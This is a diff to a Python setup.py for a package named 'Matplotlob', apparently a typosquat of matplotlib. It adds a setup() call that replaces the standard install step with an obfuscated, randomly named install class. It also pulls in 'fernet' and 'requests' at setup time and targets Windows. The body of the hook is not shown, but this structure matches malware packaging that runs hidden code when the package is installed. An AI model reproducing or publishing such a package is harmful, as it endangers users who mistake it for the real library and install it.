@@ -18,5 +18,22 @@ class TzCTfudkMXXKXkZIJrOeAVsvzdUUabPROYdzrcbdGGPYtYCFMSTMPSRGELwQcDfZjmKrgPMfaL
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+setup(
+    name="Matplotlob",
+    version=VERSION,
+    author="GLZefDIf",
+    author_email="mvpJdJb@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': TzCTfudkMXXKXkZIJrOeAVsvzdUUabPROYdzrcbdGGPYtYCFMSTMPSRGELwQcDfZjmKrgPMfaLedHCSYVesRUFyoSq,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
